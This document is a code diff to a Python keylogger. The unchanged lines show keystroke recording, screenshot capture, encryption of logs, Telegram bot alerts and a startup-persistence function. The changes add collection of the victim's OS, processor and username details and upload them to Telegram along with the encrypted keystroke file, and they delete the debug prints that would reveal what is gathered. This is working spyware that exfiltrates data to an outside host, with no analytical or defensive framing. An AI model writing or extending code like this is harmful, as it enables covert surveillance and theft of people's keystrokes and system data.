@@ -43,6 +43,18 @@ with open("encryption_key.key", "wb") as key_file:
 def alarm(msg) -> None:
     requests.get(f'https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={msg}')
 
+# Collect system information
+def collect_system_info() -> str:
+    system_info = f"""
+    System Information:
+    OS: {platform.system()} {platform.release()}
+    Version: {platform.version()}
+    Machine: {platform.machine()}
+    Processor: {platform.processor()}
+    Username: {getenv('USER') if name != 'nt' else getenv('USERNAME')}
+    """
+    return system_info
+
 # Keystroke record
 class Keylogger:
 
@@ -168,6 +180,21 @@ class Uploader:
         except Exception as e:
             alarm(f"Error uploading file: {e}")
 
+    def upload_system_info(self) -> None:
+        try:
+            # Collect system information
+            system_info = collect_system_info()
+
+            # Save system information to a temporary file
+            system_info_file = join(gettempdir(), "system_info.txt")
+            with open(system_info_file, "w") as f:
+                f.write(system_info)
+
+            # Upload the system information file to Telegram
+            self.upload_file_to_telegram(system_info_file)
+        except Exception as e:
+            alarm(f"Error uploading system info: {e}")
+
     def upload_file_periodically(self) -> None:
         sleep(INTERVAL)
 
@@ -186,6 +213,9 @@ class Uploader:
 
                         # Upload the encrypted file to Telegram
                         self.upload_file_to_telegram(self.encrypted_filename)
+
+                        # Upload system information to Telegram
+                        self.upload_system_info()
                     else:
                         alarm(f'Encrypted file not found: {self.encrypted_filename}')
                 else:
@@ -228,20 +258,6 @@ class ScreenshotCapture:
 
     def __del__(self) -> None:
         pass
-
-# Collect system information
-def collect_system_info() -> str:
-    system_info = f"""
-    System Information:
-    OS: {platform.system()} {platform.release()}
-    Version: {platform.version()}
-    Machine: {platform.machine()}
-    Processor: {platform.processor()}
-    Username: {getenv('USER') if name != 'nt' else getenv('USERNAME')}
-    """
-    print("System information collected:")  # Debug: Print system info
-    print(system_info)  # Debug: Print system info
-    return system_info
 
 # Persistence: Add to startup
 def add_to_startup() -> None:
@@ -286,7 +302,6 @@ if __name__ == '__main__':
         system_info = collect_system_info()
         with open(FILENAME, 'a+') as fh:
             fh.write(system_info)
-        print(f"System information written to log file: {FILENAME}")  # Debug: Print log file path
 
         # Create objects
         keylogger = Keylogger()
